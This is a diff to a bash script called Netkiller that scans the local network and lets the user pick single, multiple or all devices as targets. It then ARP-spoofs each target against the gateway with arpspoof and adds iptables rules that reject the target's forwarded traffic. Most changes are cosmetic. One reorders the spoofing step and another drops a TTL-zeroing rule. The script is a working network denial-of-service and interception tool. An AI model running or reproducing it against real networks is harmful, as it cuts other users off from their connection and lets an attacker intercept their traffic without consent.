@@ -57,7 +57,7 @@ IP_CIDR=$(ip -4 addr show "$WLAN" | grep -oP 'inet \K[\d./]+')
 SUB=$(ipcalc -n "$IP_CIDR" | grep "Network:" | awk '{print $2}')
 
 echo " "
-echo "[*] Current Network Information [*]"
+echo "[*]=[Current Network Information]=[*]"
 echo "[*] INTERFACE: | $WLAN"
 echo "[*] GATEWAY:   | $GW"
 echo "[*] SUBNET:    | $SUB"
@@ -89,7 +89,7 @@ MYIP="${DEVIP:-$IP}"
 echo " "
 
 # Prompt configuration
-echo "[*] Target Network Configuration [*]"
+echo "[*]=[Target Network Configuration]=[*]"
 echo "[*] INTERFACE: | $INTERFACE"
 echo "[*] GATEWAY:   | $GATEWAY"
 echo "[*] DEVICE:    | $MYIP"
@@ -105,7 +105,7 @@ then
 
 # Run arp-scan to scan the target
 echo " "
-echo "[*] Scanning for Target [*]"
+echo "[*]=[Scanning for Target]=[*]"
 echo " "
     # Execute the command if user answered 'y' or 'Y'
     arp-scan --retry=5 --bandwidth=100000 --random --localnet --interface="$WLAN"
@@ -116,11 +116,12 @@ fi
 echo " "
 
 # Target selection
-echo "[*] Select Attack [*]"
-echo "1.Single Target"
-echo "2.Multiple Target"
-echo "3.Target All"
-read -rp "Enter Choice [1-2-3]: " target_type
+echo "[*]=[Select Attack]=[*]"
+echo "1. Single Target"
+echo "2. Multiple Target"
+echo "3. Target All"
+echo " "
+read -rp "Enter your choice [1-3]: " target_type
 echo " "
 
 case $target_type in
@@ -217,7 +218,8 @@ if [ ${#TARGETS[@]} -eq 0 ]; then
 fi
 
 # Confirm before proceeding
-echo -e "\nNumber of target IP's affected: ${#TARGETS[@]}"
+echo " "
+echo "Number of target IP's affected: ${#TARGETS[@]}"
 echo " "
 read -rp "Are you sure you want to continue? (y/n) " confirm
 if [[ ! "$confirm" =~ ^[Yy]$ ]]; then
@@ -230,13 +232,13 @@ echo " "
 PIDS=()
 for TARGET in "${TARGETS[@]}"; do
      echo "Netkiller kill the target IP: $TARGET"
+   ( arpspoof -i "$INTERFACE" -t "$TARGET" -r "$GATEWAY" >/dev/null 2>&1 ) &
+     PIDS+=($!)
      iptables -A FORWARD -s "$TARGET" -p tcp -j REJECT --reject-with tcp-reset
      iptables -A FORWARD -s "$TARGET" -j REJECT --reject-with icmp-host-unreachable
-     iptables -t mangle -A FORWARD -s "$TARGET" -j TTL --ttl-set 0
-   ( arpspoof -i "$INTERFACE" -t "$TARGET" -r "$GATEWAY" >/dev/null 2>&1 ) &
-    PIDS+=($!)
 done
 
+echo " "
 echo "To stop Netkiller, run: netkiller-stop"
 echo " "
 arp -e
